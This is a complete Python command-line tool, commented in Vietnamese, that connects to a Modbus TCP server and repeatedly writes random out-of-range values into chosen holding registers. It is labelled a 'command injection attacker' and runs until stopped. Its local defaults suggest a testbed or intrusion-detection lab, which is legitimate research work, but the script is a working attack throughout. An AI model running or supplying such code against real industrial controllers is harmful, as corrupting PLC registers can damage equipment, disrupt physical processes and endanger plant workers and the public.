import argparse
import logging
import random
from typing import List

from pymodbus.client import ModbusTcpClient
from pymodbus.exceptions import ConnectionException


LOG_FORMAT = "%(asctime)s [%(levelname)s] [ModbusCmdInjection] %(message)s"
logging.basicConfig(level=logging.INFO, format=LOG_FORMAT)
logger = logging.getLogger(__name__)


# Hàm này kết nối tới server Modbus và ghi ngẫu nhiên các giá trị độc hại vào danh sách địa chỉ holding register mục tiêu.
def inject_commands(
    host: str,
    port: int,
    addresses: List[int],
    min_value: int,
    max_value: int,
    iterations: int,
    unit_id: int,
) -> None:
    logger.info(
        "Starting command injection against %s:%d on addresses=%s, value range=[%d,%d]",
        host,
        port,
        addresses,
        min_value,
        max_value,
    )

    client = ModbusTcpClient(host=host, port=port)
    try:
        if not client.connect():
            raise ConnectionException("Unable to connect to Modbus server")

        for i in range(iterations if iterations > 0 else 1_000_000_000):
            addr = random.choice(addresses)
            value = random.randint(min_value, max_value)
            resp = client.write_register(address=addr, value=value, slave=unit_id)
            if resp.isError():
                logger.error("Write error at %d: %s", addr, resp)
            else:
                logger.warning(
                    "Injected malicious write #%d: holding_register[%d] = %d",
                    i + 1,
                    addr,
                    value,
                )
    except KeyboardInterrupt:
        logger.info("Stopping command injection (KeyboardInterrupt).")
    finally:
        client.close()


 # Hàm main đọc tham số CLI (địa chỉ, khoảng giá trị, số lần ghi, unit id) rồi gọi inject_commands.
def main() -> None:
    parser = argparse.ArgumentParser(
        description="Modbus command injection attacker (malicious writes to holding registers).",
    )
    parser.add_argument("--host", default="127.0.0.1", help="Target Modbus server host.")
    parser.add_argument("--port", type=int, default=5020, help="Target Modbus server port.")
    parser.add_argument(
        "--addresses",
        type=int,
        nargs="+",
        default=[0, 1, 2],
        help="Target holding register addresses to corrupt.",
    )
    parser.add_argument(
        "--min-value",
        type=int,
        default=5000,
        help="Minimum malicious value.",
    )
    parser.add_argument(
        "--max-value",
        type=int,
        default=10000,
        help="Maximum malicious value.",
    )
    parser.add_argument(
        "--iterations",
        type=int,
        default=0,
        help="Number of writes (0 = very large / effectively infinite until Ctrl+C).",
    )
    parser.add_argument(
        "--unit-id",
        type=int,
        default=1,
        help="Modbus unit id used in write requests.",
    )
    args = parser.parse_args()

    inject_commands(
        host=args.host,
        port=args.port,
        addresses=args.addresses,
        min_value=args.min_value,
        max_value=args.max_value,
        iterations=args.iterations,
        unit_id=args.unit_id,
    )


if __name__ == "__main__":
    main()

